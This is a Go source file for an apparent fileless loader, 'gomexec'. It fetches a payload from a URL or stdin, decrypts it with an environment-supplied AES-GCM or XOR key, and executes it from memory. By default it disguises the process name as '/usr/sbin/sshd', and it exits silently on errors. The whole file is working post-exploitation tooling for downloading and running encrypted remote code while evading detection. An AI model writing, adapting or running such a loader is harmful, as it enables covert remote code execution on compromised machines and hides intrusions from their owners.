//go:build linux

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io"
	"os"

	"github.com/ohmymex/gomexec/pkg/exec"
)

func main() {
	debug := os.Getenv("DEBUG") == "1"

	name := os.Getenv("NAME")
	if name == "" {
		name = "/usr/sbin/sshd"
	}

	argv := buildArgv(name, os.Args[1:])
	keyHex := os.Getenv("KEY")
	urlEnv := os.Getenv("URL")

	if keyHex != "" {
		// AES-GCM needs full ciphertext before decryption — buffered path
		raw, err := readPayload(urlEnv, debug)
		if err != nil {
			fatal(debug, "read: %v", err)
		}
		payload, err := decrypt(keyHex, raw)
		if err != nil {
			fatal(debug, "decrypt: %v", err)
		}
		if err := exec.Run(payload, argv, os.Environ()); err != nil {
			fatal(debug, "exec: %v", err)
		}
		return
	}

	// No decryption — stream directly into memfd
	r, err := openReader(urlEnv, debug)
	if err != nil {
		fatal(debug, "open: %v", err)
	}
	if r != os.Stdin {
		defer r.Close()
	}
	if err := exec.RunFromReader(r, argv, os.Environ()); err != nil {
		fatal(debug, "exec: %v", err)
	}
}

func buildArgv(name string, args []string) []string {
	argv := []string{name}
	for i, arg := range args {
		if arg == "--" {
			argv = append(argv, args[i+1:]...)
			break
		}
	}
	return argv
}

func readPayload(url string, debug bool) ([]byte, error) {
	r, err := openReader(url, debug)
	if err != nil {
		return nil, err
	}
	if r != os.Stdin {
		defer r.Close()
	}
	return io.ReadAll(r)
}

func openReader(url string, _ bool) (io.ReadCloser, error) {
	if url != "" {
		return exec.Fetch(url)
	}
	return os.Stdin, nil
}

func decrypt(keyHex string, data []byte) ([]byte, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, fmt.Errorf("invalid key hex: %w", err)
	}
	if len(key) == 32 {
		return decryptAESGCM(key, data)
	}
	return xorCrypt(key, data), nil
}

func decryptAESGCM(key, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("ciphertext too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}

func xorCrypt(key, data []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

func fatal(debug bool, format string, args ...any) {
	if debug {
		fmt.Fprintf(os.Stderr, "gomexec: "+format+"\n", args...)
	}
	os.Exit(1)
}
